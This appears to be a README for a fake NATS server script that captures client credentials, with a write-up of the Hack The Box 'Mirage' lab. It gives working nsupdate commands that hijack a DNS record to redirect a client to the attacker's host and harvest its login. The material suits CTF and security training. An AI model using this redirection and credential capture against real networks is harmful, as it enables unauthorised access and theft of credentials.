# 🛰️ Fake NATS Server

`fake-nats.py` is a lightweight fake NATS server written in Python. It listens on the default NATS port and emulates a legitimate NATS server to capture client authentication attempts.

Perfect for **CTFs**, **red team simulations**, **reverse engineering**, or **honeypot setups**.

---

## ⚙️ Features

- Listens on `0.0.0.0:4222` (default NATS port)
- Sends a valid NATS `INFO` banner on connection
- Captures and prints incoming client payloads (e.g., credentials)

---

## 🛠️ Requirements

- Python 3.x

---

## 🚀 Usage

```bash
python3 fake-nats.py
```
---

## 🎯 Case Study: HTB Mirage – Credential Harvesting via Fake NATS

In the Hack The Box machine **"Mirage"**, a NATS server is accessible at `nats-svc.mirage.htb:4222`. The target service expects clients to authenticate using a username and password.

### 🎯 Objective

Harvest NATS client credentials by deploying a fake server and luring the legitimate client to connect to us instead of the real `nats-svc.mirage.htb`.

---

### 🧪 Attack Path

#### 1. **Exploit Dynamic DNS (nonsecure)**

The Domain Controller supports **Secure and Nonsecure** updates. We exploit this using a crafted input for `nsupdate` to overwrite the A record for `nats-svc.mirage.htb`.

Example update file:

```bash
# nsupdate-nats.txt
server <MIRAGE IP>
zone mirage.htb
update add nats-svc.mirage.htb 15 A <YOUR-IP>
send
```
then just use nsupdate:
```bash
nsupdate -v nsupdate-nats.txt
```

More details on: mirage-exploit.py
